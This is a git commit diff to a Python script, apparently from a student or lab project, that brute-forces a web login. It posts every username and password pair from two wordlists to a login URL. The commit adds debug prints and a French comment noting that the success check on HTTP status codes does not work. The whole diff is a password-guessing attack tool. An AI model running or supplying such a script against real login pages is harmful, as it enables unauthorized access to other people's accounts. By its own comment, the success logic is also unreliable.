7d65b5bfe69d74bffc5bcbd630788f72f05405d0
quentin-csg <qcassaigne73@gmail.com>
2023-03-21 11:31:32 -0400

    update

--- code_fonctionne/bruteforce_qui_fonctionne.py
+++ code_fonctionne/bruteforce_qui_fonctionne.py
@@ -8,13 +8,18 @@ with open('./wordlists/userlist.txt', 'r') as userfile:
     users = userfile.readlines()
 with open('./wordlists/passwordlist.txt', 'r') as passfile:
     passwords = passfile.readlines()
-
+i=0
 for user in users:
     for password in passwords:
+        i+=1
+        print(i)
         user = user.strip()
         password = password.strip()
         data = {'username': user, 'password': password}
+        print(data)
         a = r.post(url, data=data)
+        print(a.status_code)
+        """ fonctionne pas, met 200 mm qd requête est vraie, plutôt mettre qd ya redirection = récupère data """
         if (a.status_code) != 200:
             print(f'Successful login with username = "{user}" : and password = "{password}".')
             break
